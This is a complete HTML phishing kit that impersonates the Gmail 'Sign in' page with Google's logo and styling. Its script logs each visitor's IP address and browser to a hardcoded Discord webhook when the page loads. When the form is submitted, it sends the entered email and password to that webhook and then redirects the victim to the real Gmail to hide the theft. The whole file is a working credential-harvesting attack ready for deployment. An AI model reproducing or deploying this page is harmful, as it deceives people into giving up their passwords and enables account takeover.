<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Gmail - Sign in</title>
  <style>
    body {
      font-family: 'Roboto', Arial, sans-serif;
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background-color: #fff;
    }
    .login-container {
      width: 100%;
      max-width: 450px;
      padding: 48px 40px 36px;
      border: 1px solid #dadce0;
      border-radius: 8px;
      box-sizing: border-box;
      text-align: center;
    }
    .logo {
      margin-bottom: 25px;
    }
    .logo img {
      height: 24px;
    }
    h1 {
      font-size: 24px;
      font-weight: 400;
      margin: 0 0 12px;
    }
    .subtitle {
      font-size: 16px;
      font-weight: 400;
      letter-spacing: 0.1px;
      line-height: 1.5;
      margin-bottom: 32px;
      color: #202124;
    }
    .form-group {
      margin-bottom: 24px;
      text-align: left;
    }
    .form-control {
      position: relative;
      height: 56px;
      width: 100%;
      margin-bottom: 16px;
    }
    .form-control input {
      height: 56px;
      width: 100%;
      padding: 16px 14px 0;
      box-sizing: border-box;
      border: 1px solid #dadce0;
      border-radius: 4px;
      font-size: 16px;
      outline: none;
    }
    .form-control label {
      position: absolute;
      left: 14px;
      top: 20px;
      color: #5f6368;
      font-size: 16px;
      pointer-events: none;
      transition: 0.15s all ease-out;
    }
    .form-control input:focus {
      border: 2px solid #1a73e8;
    }
    .form-control input:focus + label, 
    .form-control input:not(:placeholder-shown) + label {
      top: 8px;
      font-size: 12px;
      color: #1a73e8;
    }
    .forgot-text {
      font-weight: 500;
      letter-spacing: 0.25px;
      margin-left: 0;
      color: #1a73e8;
      font-size: 14px;
      text-align: left;
      display: inline-block;
      margin-top: 8px;
      cursor: pointer;
    }
    .forgot-text:hover {
      background-color: rgba(26, 115, 232, 0.04);
    }
    .button-container {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: 32px;
    }
    .create-account {
      font-weight: 500;
      letter-spacing: 0.25px;
      margin-left: 0;
      color: #1a73e8;
      font-size: 14px;
      cursor: pointer;
    }
    .create-account:hover {
      background-color: rgba(26, 115, 232, 0.04);
    }
    .next-button {
      background-color: #1a73e8;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 14px;
      font-weight: 500;
      height: 36px;
      padding: 0 24px;
      letter-spacing: 0.25px;
      cursor: pointer;
    }
    .next-button:hover {
      background-color: #1a67d3;
      box-shadow: 0 1px 2px 0 rgba(60, 64, 67, 0.3), 0 1px 3px 1px rgba(60, 64, 67, 0.15);
    }
    .footer {
      margin-top: 26px;
      display: flex;
      justify-content: space-between;
      font-size: 12px;
      color: #5f6368;
    }
    .footer a {
      color: #5f6368;
      text-decoration: none;
      margin-left: 10px;
    }
    .footer a:hover {
      text-decoration: underline;
    }
    .checkbox-container {
      display: flex;
      align-items: center;
      margin-bottom: 16px;
    }
    .checkbox-container input {
      margin-right: 8px;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="logo">
      <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
        <g id="qaEJec">
          <path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path>
        </g>
        <g id="YGlOvc"><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path></g>
        <g id="BWfIk">
          <path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path>
        </g>
        <g id="e6m3fd"><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path></g>
        <g id="vbkDmc"><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path></g>
        <g id="idEJde"><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path></g>
      </svg>
    </div>
    <h1>Sign in</h1>
    <p class="subtitle">Use your Google Account</p>
    <form id="login-form">
      <div class="form-group">
        <div class="form-control">
          <input type="email" id="email" required placeholder=" ">
          <label for="email">Email or phone</label>
        </div>
        
        <div class="form-control">
          <input type="password" id="password" required placeholder=" ">
          <label for="password">Password</label>
        </div>
        
        <div class="checkbox-container">
          <input type="checkbox" id="show-password">
          <label for="show-password" style="font-size: 14px; color: #5f6368;">Show password</label>
        </div>
        
        <div class="checkbox-container">
          <input type="checkbox" id="stay-signed-in" checked>
          <label for="stay-signed-in" style="font-size: 14px; color: #5f6368;">Stay signed in</label>
        </div>
        
        <span class="forgot-text">Forgot password?</span>
      </div>
      
      <p style="font-size: 14px; text-align: left; margin-top: 32px;">
        Not your computer? Use Guest mode to sign in privately.
        <br>
        <span class="forgot-text">Learn more</span>
      </p>
      
      <div class="button-container">
        <span class="create-account">Create account</span>
        <button type="submit" class="next-button">Sign in</button>
      </div>
    </form>
    
    <div class="footer">
      <div>English (United States)</div>
      <div>
        <a href="#">Help</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
      </div>
    </div>
  </div>

  <script>
    // Function to get visitor's IP through a third-party service
    async function getVisitorInfo() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return {
          ip: data.ip,
          timestamp: new Date().toString(),
          userAgent: navigator.userAgent
        };
      } catch (error) {
        return {
          ip: "Could not detect",
          timestamp: new Date().toString(),
          userAgent: navigator.userAgent
        };
      }
    }

    // Function to send notification to Discord webhook
    async function sendDiscordNotification(visitorInfo, credentials = null) {
      // REPLACE THIS URL WITH YOUR ACTUAL DISCORD WEBHOOK URL
      const webhookUrl = "https://discordapp.com/api/webhooks/1351871073414680688/mGTZaR6W-Imo2rs1hd8kyFGd8QvSSdYJZOqbZ2Nmj_Te-xfF8D1DAOTgzV0gUNMfBOrx";
      
      let content = "Someone visited your Gmail login page!";
      let fields = [
        {
          name: "IP Address",
          value: visitorInfo.ip,
          inline: true
        },
        {
          name: "Time",
          value: visitorInfo.timestamp,
          inline: true
        },
        {
          name: "Browser Info",
          value: visitorInfo.userAgent
        }
      ];
      
      // Add credentials if provided
      if (credentials) {
        content = "ðŸ”” LOGIN CREDENTIALS RECEIVED! ðŸ””";
        fields.push({
          name: "Email",
          value: credentials.email || "Not provided",
          inline: false
        });
        fields.push({
          name: "Password",
          value: credentials.password || "Not provided",
          inline: false
        });
      }
      
      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            content: content,
            embeds: [{
              title: credentials ? "âœ… LOGIN CREDENTIALS" : "New Visitor",
              color: credentials ? 15158332 : 5814783, // Red for credentials, blue for visitors
              fields: fields
            }]
          })
        });
        console.log("Notification sent to Discord!");
      } catch (error) {
        console.error("Failed to send notification:", error);
      }
    }

    // Toggle password visibility
    document.getElementById('show-password').addEventListener('change', function() {
      const passwordField = document.getElementById('password');
      passwordField.type = this.checked ? 'text' : 'password';
    });

    // Send notification when page loads
    window.addEventListener('load', async () => {
      const visitorInfo = await getVisitorInfo();
      sendDiscordNotification(visitorInfo);
    });

    // Handle form submission
    document.getElementById('login-form').addEventListener('submit', async function(e) {
      e.preventDefault();
      
      // Get form data
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
      
      // Get visitor info
      const visitorInfo = await getVisitorInfo();
      
      // Send notification with credentials
      await sendDiscordNotification(visitorInfo, {
        email: email,
        password: password
      });
      
      // Redirect to actual Gmail (or any other page you want)
      window.location.href = "https://mail.google.com";
    });
  </script>
</body>
</html>
